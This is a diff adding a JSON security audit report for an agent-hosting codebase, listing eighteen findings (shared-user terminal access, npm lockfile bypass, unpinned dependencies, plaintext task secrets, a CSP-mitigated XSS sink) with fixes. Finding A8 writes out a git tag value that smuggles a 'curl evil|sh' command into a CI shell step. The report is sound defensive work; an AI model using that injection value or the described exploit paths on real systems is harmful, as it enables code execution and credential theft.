@@ -1,0 +1,207 @@
+{
+  "version": "1.1",
+  "date": "2026-07-13",
+  "mode": "full",
+  "scope": "full-codebase (all phases 0-14, daily 8/10 confidence gate)",
+  "branch": "dev",
+  "phases_run": [0,1,2,3,4,5,6,7,8,9,10,11,12,13,14],
+  "attack_surface": {
+    "backend_routers": 68,
+    "http_routes": 430,
+    "websocket_endpoints": 5,
+    "unauthenticated_routers": ["public.py","public_links.py","paid.py","webhooks.py","files.py","setup.py","auth.py","internal.py"],
+    "ci_workflows": 18,
+    "dockerfiles_prod": 5,
+    "docker_networks": 2,
+    "python_deps_backend": 36,
+    "node_projects": 3
+  },
+  "findings": [
+    {
+      "id": "F1", "severity": "medium", "confidence": 9, "status": "VERIFIED",
+      "category": "access_control_privilege_tier", "phase": "P9/P1",
+      "title": "Shared (chat-only) users get owner-tier capabilities: in-container terminal + schedule enable/disable/trigger",
+      "file": "src/backend/routers/agents.py:1255; src/backend/services/agent_service/terminal.py:124; src/backend/routers/schedules.py:364-405; src/backend/dependencies.py:497-527",
+      "exploit": "A user the agent was shared with (agent_sharing, default_role=user = chat-only grant) connects to WS /api/agents/{name}/terminal, authenticates with their JWT (can_user_access_agent passes for shared users), and gets an interactive shell as the container 'developer' user - reading .env, the per-agent GitHub PAT, CLAUDE_CODE_OAUTH_TOKEN, and TRINITY_MCP_API_KEY, and acting as the agent. The same shared user can also POST .../schedules/{id}/enable|disable|trigger (AuthorizedAgent tier) to toggle autonomous behavior and fire executions.",
+      "impact": "Least-privilege / privilege-tier violation: chat-only collaborators obtain credential read and code-exec inside the agent container. Note the SSH-access endpoint IS admin-only (require_admin), making the terminal WS the inconsistency. Blast radius capped by the fact the actor is a deliberately-shared user, not an anonymous attacker.",
+      "recommendation": "Gate the terminal WS and schedule enable/disable/trigger with owner-tier access (OwnedAgent / can_user_share_agent), matching update_schedule/delete_schedule and the admin-only SSH endpoint."
+    },
+    {
+      "id": "F2", "severity": "medium", "confidence": 9, "status": "VERIFIED",
+      "category": "supply_chain_process", "phase": "P3",
+      "title": "Node image builds bypass the tracked lockfiles (npm install, and frontend deletes package-lock.json)",
+      "file": "src/mcp-server/Dockerfile:12,19; docker/frontend/Dockerfile:9; docker/frontend/Dockerfile.prod:13",
+      "exploit": "Every image build runs `npm install` (the dev frontend does `rm -f package-lock.json && npm install`) instead of `npm ci`, so semver ranges are re-resolved at build time and all install scripts run with no --ignore-scripts. A malicious patch release of any (transitive) dependency ships into the image; the clean `npm audit` on the committed lockfile does not attest what actually gets built.",
+      "impact": "The lockfile ceases to be a supply-chain control at build time. Combined with F8 (Dependabot auto-merge to a repo whose push-to-dev triggers deploy-dev), a compromised upstream patch can reach the dev VM unreviewed.",
+      "recommendation": "Use `npm ci` (or `npm ci --omit=dev`) in all three Dockerfiles; keep the frontend's optionalDependencies platform-binary approach (already correct) instead of deleting the lockfile."
+    },
+    {
+      "id": "F3", "severity": "medium", "confidence": 9, "status": "VERIFIED",
+      "category": "cicd_governance", "phase": "P4",
+      "title": "CODEOWNERS exists for workflow files but code-owner review is not enforced on dev/main",
+      "file": ".github/CODEOWNERS:11",
+      "exploit": "Live gh API check: require_code_owner_reviews=false on both dev and main. Any collaborator plus any one approver (not the designated owner) can merge a workflow change - e.g. adding a secret sink or a new on:pull_request trigger. The documented control is advisory-only. CODEOWNERS also does not cover scripts/deploy/start.sh / scripts/ci/**, which secret-adjacent workflows execute.",
+      "impact": "The intended maintainer-review gate on CI/CD - the most security-sensitive files in the repo - is not active.",
+      "recommendation": "Enable 'Require review from Code Owners' in branch protection for dev and main; extend CODEOWNERS to scripts/deploy and scripts/ci."
+    },
+    {
+      "id": "F4", "severity": "medium", "confidence": 9, "status": "VERIFIED",
+      "category": "data_at_rest_plaintext", "phase": "P2",
+      "title": "Caller-supplied task content persists plaintext in schedule_executions.backlog_metadata; not nulled on drain; canary G-04 blind after drain",
+      "file": "src/backend/services/backlog_service.py:92-118; src/backend/db/schedules.py:1254-1302",
+      "exploit": "When an agent's slots are full, the async /task path (routers/chat.py) writes the raw request - message, caller-supplied system_prompt, user_message verbatim - into backlog_metadata (plaintext JSON). claim_next_queued() sets queued_at=None but does NOT null backlog_metadata, so the blob survives on the running/terminal row until the 90-day execution_row_retention_days sweep. Canary G-04 (the secret-in-backlog check) only scans status='queued' rows, so once drained a leaked secret is unscanned.",
+      "impact": "Any secret a user or calling agent embeds in a /task body sits plaintext at rest (SQLite ~/trinity-data/trinity.db) for up to 90 days and evades the G-04 tripwire. Not API-serialized (ExecutionResponse omits the field), so exposure is DB-at-rest + drain replay only. Same at-rest posture as chat_messages, but this copy outlives its need and is undetected.",
+      "recommendation": "Null backlog_metadata at drain-claim (the RETURNING already captures it for replay) and/or run the credential sanitizer over message/system_prompt before persisting; widen G-04 to running/terminal rows (ties to #1449)."
+    },
+    {
+      "id": "F5", "severity": "medium", "confidence": 9, "status": "VERIFIED",
+      "category": "supply_chain_pinning", "phase": "P3",
+      "title": "Scheduler and agent-base runtime dependencies are unpinned; base image pulls @anthropic-ai/claude-code@latest with no integrity pin",
+      "file": "docker/scheduler/requirements.txt:5-29; docker/base-image/Dockerfile:48,51,81-89",
+      "exploit": "Scheduler deps (apscheduler, redis, aiohttp, ...) are all floating '>='. The agent base image installs fastapi/uvicorn/httpx/pydantic/cryptography unpinned and `npm install -g @anthropic-ai/claude-code@latest` + `@google/gemini-cli` untagged - every rebuild pulls whatever is newest with no hash pin (codex IS pinned to 0.139.0, showing the pattern is available).",
+      "impact": "A malicious upstream release is silently incorporated on the next rebuild of the scheduler or the universal agent base image (the latter runs in every agent container).",
+      "recommendation": "Pin all runtime deps with '==' (and hashes where practical); pin the global npm CLIs to explicit versions like codex already is."
+    },
+    {
+      "id": "F6", "severity": "medium", "confidence": 8, "status": "VERIFIED",
+      "category": "business_confidentiality_enterprise_disclosure", "phase": "P2",
+      "title": "Paid-feature catalog disclosed in live public docs that the enterprise-docs CI guard cannot see",
+      "file": "docs/user-docs/whats-new/v0.8.0.md; docs/user-docs/whats-new/README.md; docs/user-docs/dev-announcements/2026-07-09-121500.md; docs/memory/architecture.md:1082",
+      "exploit": "The enterprise-docs-guard workflow passes, but its keyword regex does not match natural-language forms: a whats-new page enumerates ~5 paid-tier capabilities by name, and architecture.md names a specific private enterprise module id in live prose (the exact #1461 class the guard exists to catch). No schema/design leaked - names only.",
+      "impact": "Violates the standing rule (CLAUDE.md: public docs carry 'no catalog of specific paid features'). Business-confidentiality, not a technical vuln. Likely deliberate release marketing, so a policy decision is needed rather than an automatic scrub.",
+      "recommendation": "Decide: either bless release-facing catalogs (exclude whats-new/ + dev-announcements/ from the guard like releases/ already is) or genericize the prose and extend the guard token list. Genericize the architecture.md module-name sentence regardless."
+    },
+    {
+      "id": "F7", "severity": "medium", "confidence": 8, "status": "VERIFIED",
+      "category": "supply_chain_cve", "phase": "P3",
+      "title": "python-multipart==0.0.20 carries reachable HIGH advisories (DoS-class)",
+      "file": "docker/backend/Dockerfile:46",
+      "exploit": "CVE-2026-53539 (quadratic querystring parsing) is reachable via the unauthenticated form-encoded POST /api/token and the Slack/Twilio webhook receivers; CVE-2026-42561 (unbounded multipart part-header) via the authenticated tar upload at routers/agent_data.py:387.",
+      "impact": "Availability (request-processing amplification) on an unauthenticated endpoint. DoS-class, so severity moderated, but the fix is a one-line bump.",
+      "recommendation": "Bump python-multipart to ==0.0.31."
+    },
+    {
+      "id": "A1", "severity": "low", "confidence": 8, "status": "VERIFIED-MITIGATED",
+      "category": "xss_stored_defense_in_depth", "phase": "P7",
+      "title": "Brain Orb page interpolates agent-authored node titles raw into innerHTML (escaping inconsistency); prod CSP blocks exploitation",
+      "file": "src/frontend/public/brain-orb/orb.js:462,688,925,932",
+      "exploit": "Node titles from the agent's byte-passthrough data.json are inserted raw into innerHTML, while the search path (_escHtml, :1050) and note bodies (DOMPurify, :659) are sanitized. In DEV (vite CSP allows unsafe-inline) an <img onerror> title would execute and read the JWT held at orb.js:50. In PROD, security-headers.conf:31 sets script-src 'self' (no unsafe-inline) + connect-src/img-src restrictions, blocking inline-handler execution and exfiltration - so only markup/CSS injection (defacement/phishing) remains, not script exec or JWT theft.",
+      "impact": "Real stored HTML-injection sink; production script-exec/JWT-theft refuted by CSP (adversarially verified). CSP is the single mitigating control.",
+      "recommendation": "Wrap the four sites in the existing _escHtml (orb.js:643) so escaping is consistent and not solely CSP-dependent."
+    },
+    {
+      "id": "A2", "severity": "low", "confidence": 8, "status": "VERIFIED-MITIGATED", "persistent": true,
+      "category": "auth_crypto", "phase": "P9",
+      "title": "Slack channel email-verification code: non-CSPRNG + no dedicated attempt cap",
+      "file": "src/backend/adapters/slack_adapter.py:606-608,551-559",
+      "exploit": "_generate_verification_code uses random.choices (Mersenne Twister), and slack_pending_verifications has no attempts column, so guesses are unbounded per code. Adversarial verification: the generic per-user message limiter (message_router.py:45,400-405, 30/60s) throttles blind guessing to ~300/10-min window = ~0.03% success, and the code is emailed to the victim (never observable to the attacker), so MT-prediction has no data. A takeover expects ~23 days of guessing plus ~3,300 verification emails to the victim.",
+      "impact": "Real defects (non-CSPRNG, no verification-specific lockout), but the identity-takeover exploit is throttled and victim-visible. Scope on success is one agent (SLACK-001).",
+      "recommendation": "code = f\"{secrets.randbelow(1_000_000):06d}\"; add an attempts counter with lockout mirroring OTP_MAX_ATTEMPTS."
+    },
+    {
+      "id": "A3", "severity": "low", "confidence": 6, "status": "TENTATIVE",
+      "category": "misconfiguration_exposure", "phase": "P5",
+      "title": "Prod compose host-publishes internal + unauthenticated otel ports on 0.0.0.0",
+      "file": "docker-compose.prod.yml:32,462,483,558,560,561; config/otel-collector.yaml:14-16,40",
+      "exploit": "backend:8000, mcp-server:8080, vector:8686, and the unauthenticated otel OTLP gRPC 4317 / Prometheus 8889 are host-published while cloudflared already reaches every service over the Docker network. On a host without a firewall these are directly reachable (unauth telemetry injection / internal-metrics leak).",
+      "impact": "Conditional on host firewall posture (an operator assumption, not enforced in-repo). Redis is correctly expose:-only, showing the intended pattern.",
+      "recommendation": "Switch these services to expose: (or bind loopback) as Redis already does; the tunnel needs no host ports mapping."
+    },
+    {
+      "id": "A4", "severity": "medium", "confidence": 8, "status": "ACCEPTED-RISK-DESIGN",
+      "category": "cicd_supply_chain", "phase": "P4",
+      "title": "Dependabot auto-merge PAT bypasses human review; push-to-dev triggers deploy-dev",
+      "file": ".github/workflows/dependabot-auto-merge.yml:87,94-96",
+      "exploit": "A machine PAT supplies the counting approval for semver patch/minor bumps, then deploy-dev.yml (push-to-dev) builds and runs the result on the dev VM with sudo docker - no human sees the diff. Compounds with F2 (npm install re-resolves + runs install scripts).",
+      "impact": "Unattended path from a malicious upstream patch release to code execution on the dev VM. Implementation itself is sound (actor gate, no PR-code checkout, PAT in Dependabot secret store).",
+      "recommendation": "Exclude install-script-capable ecosystems from auto-merge or add a hold window; combine with F2's npm ci fix."
+    },
+    {
+      "id": "A5", "severity": "low", "confidence": 7, "status": "TENTATIVE", "persistent": true,
+      "category": "crypto_config", "phase": "P9",
+      "title": "Documented placeholder SECRET_KEY accepted with only a warning",
+      "file": "src/backend/config.py:46-55",
+      "exploit": "If an operator deploys with SECRET_KEY='your-secret-key-change-in-production', HS256 JWTs are forgeable with a public constant (full auth bypass to admin). Unset is safe (random). Only the explicit-placeholder path warns instead of raising.",
+      "impact": "Config-dependent full auth bypass.",
+      "recommendation": "raise RuntimeError on the known placeholder, matching the REDIS_URL hard-fail at config.py:66."
+    },
+    {
+      "id": "A6", "severity": "low", "confidence": 4, "status": "TENTATIVE", "persistent": true,
+      "category": "timing", "phase": "P6",
+      "title": "Telegram webhook secret-token compared with != (non-constant-time)",
+      "file": "src/backend/adapters/transports/telegram_webhook.py:54",
+      "exploit": "actual_token != expected_token on the X-Telegram-Bot-Api-Secret-Token header is a timing side-channel; impractical (network jitter, secret is a secondary factor behind the URL secret).",
+      "impact": "Low; one-line fix.",
+      "recommendation": "hmac.compare_digest."
+    },
+    {
+      "id": "A7", "severity": "low", "confidence": 4, "status": "TENTATIVE-MITIGATED", "persistent": true,
+      "category": "ssrf_hardening", "phase": "P6",
+      "title": "slack_service.download_file fetches an event-supplied URL with the bot token and no host allowlist",
+      "file": "src/backend/services/slack_service.py:702-726",
+      "exploit": "follow_redirects=True with no host gate (unlike the WhatsApp path). Practically low: Slack signature verification gates the event so the attacker does not control the host, and httpx strips Authorization on cross-host redirects.",
+      "impact": "Defense-in-depth parity gap.",
+      "recommendation": "Add a files.slack.com/*.slack.com allowlist + redirect re-validation, mirroring whatsapp_adapter."
+    },
+    {
+      "id": "A8", "severity": "low", "confidence": 8, "status": "VERIFIED",
+      "category": "cicd_injection", "phase": "P4",
+      "title": "publish-cli.yml interpolates the git tag name into a shell sed; pypi environment ungated",
+      "file": ".github/workflows/publish-cli.yml:73,97,114,128,139",
+      "exploit": "version derives from the pushed tag (GITHUB_REF_NAME); a tag like cli-v0.0.1'; curl evil|sh # injects into a runner with contents:write + PyPI OIDC. Requires tag-push access. The pypi environment has zero protection rules, so any merge to main touching src/cli/** auto-publishes.",
+      "impact": "Defense-in-depth against a compromised contributor with push access; PyPI Trusted Publishing means no long-lived token exists.",
+      "recommendation": "Pass the version via env and validate against a semver regex; add a protection rule / required reviewer to the pypi environment."
+    },
+    {
+      "id": "A9", "severity": "low", "confidence": 9, "status": "VERIFIED",
+      "category": "cicd_hardening", "phase": "P4",
+      "title": "Missing permissions: blocks + latent E2E secrets on pull_request triggers",
+      "file": ".github/workflows/frontend-build.yml; deploy-dev.yml; container-security.yml:107,123; frontend-e2e.yml:121,137",
+      "exploit": "frontend-build/deploy-dev declare no permissions: (repo default is read today, so nil impact - a ratchet if the org flips to read/write). container-security and frontend-e2e reference secrets.E2E_* on pull_request triggers that run PR-modifiable code; the secrets are absent at repo level today so the sink is empty (latent).",
+      "impact": "No live exposure today; both are latent regressions waiting on a settings/secret change.",
+      "recommendation": "Add permissions: contents: read + persist-credentials: false (house pattern); strip the unused secrets.E2E_* fallbacks - the random-password branch already works."
+    },
+    {
+      "id": "A10", "severity": "low", "confidence": 3, "status": "TENTATIVE",
+      "category": "access_control_defense_in_depth", "phase": "P6",
+      "title": "/user-memory endpoint lacks the explicit agent-scoped self-gate the heartbeat/reports endpoints use",
+      "file": "src/backend/routers/public_memory.py:53-61",
+      "exploit": "Gates on can_user_access_agent + execution.agent_name==agent_name but not current_user.agent_name==agent_name. A sibling agent key whose owner also owns A could write A's memory IF it supplies a user-facing execution UUID belonging to A - non-enumerable, so not a practical forge.",
+      "impact": "Consistency/defense-in-depth gap vs the authorize_heartbeat pattern.",
+      "recommendation": "Add the explicit self-gate for parity."
+    },
+    {
+      "id": "A11", "severity": "info", "confidence": 8, "status": "NOTED",
+      "category": "supply_chain_capability", "phase": "P3",
+      "title": "pipenet (remote-tunnel capability) ships dormant in the MCP server production dependency tree",
+      "file": "src/mcp-server (fastmcp@4.4.0 -> mcp-proxy@6.5.1 -> pipenet@1.4.2)",
+      "exploit": "A 'expose your local server to the public internet' library sits in the prod tree via mcp-proxy's tunnel feature; dormant unless invoked, but it is remote-tunneling capability shipped in the image.",
+      "impact": "Informational; no active use path found.",
+      "recommendation": "Confirm mcp-proxy's tunnel path is unreachable in Trinity's MCP runtime; consider trimming if unused."
+    }
+  ],
+  "resolved_since_2026_06_21": [
+    "CRITICAL: unauthenticated agent-server reachable by peer agents -> #1159 pure-ASGI X-Trinity-Agent-Token middleware (constant-time, /health-only exempt, gates WS)",
+    "HIGH: fastmcp pulling HIGH hono/undici/form-data into MCP server -> bumped (hono 4.12.25 / undici 7.28.0 / form-data 4.0.6) + overrides floor",
+    "HIGH: form-data HIGH CRLF via axios in prod frontend -> axios 1.18.1 / form-data 4.0.6",
+    "MEDIUM: agent-server credential-path policy divergence -> vendored copies byte-identical (parity tests green)",
+    "MEDIUM: sibling-prefix path traversal / credentials-update lstrip -> _safe_credential_target + is_allowed_credential_path full deny-list",
+    "LOW: three agent_config GET handlers leaked config -> AuthorizedAgentByName / access-first (test_186 29 passed)",
+    "LOW: server-side SSH keygen returned private key -> client-supplied public_key only, admin-only"
+  ],
+  "persistent_from_2026_06_21": [
+    "Slack verification code non-CSPRNG + no attempt cap (A2)",
+    "slack_service.download_file no host allowlist (A7)",
+    "SECRET_KEY placeholder accepted with warning (A5)",
+    "Telegram webhook secret != non-constant-time (A6)",
+    "Secrets referenced on pull_request-triggered stack-boot jobs (A9, partial)"
+  ],
+  "filter_stats": {
+    "candidates_considered": 34,
+    "reported": 18,
+    "verified_and_downgraded_by_adversarial_verifier": ["A1 (orb.js XSS -> CSP-mitigated LOW)", "A2 (Slack takeover -> rate-limited LOW)"],
+    "excluded_by_fp_rules": ["OTP/login rate-limiter fail-open (rate-limit/DoS class)", "Docker socket :ro API-verb caveat (inherent to Invariant #11)", "Redis ~* no per-tenant key isolation (requires prior total backend compromise)"]
+  },
+  "totals": { "critical": 0, "high": 0, "medium": 7, "low": 10, "info": 1, "total": 18 },
+  "trend": "Strong downward on top severity: the prior cycle's 1 CRITICAL and both HIGH findings are all RESOLVED; 3 of the prior LOWs resolved. No CRITICAL or exploitable-HIGH this cycle - the ceiling is MEDIUM. 5 persistent LOWs carried forward. Highest-value NEW findings: shared-user privilege tier (F1), npm-ci lockfile bypass (F2), CODEOWNERS not enforced (F3)."
+}
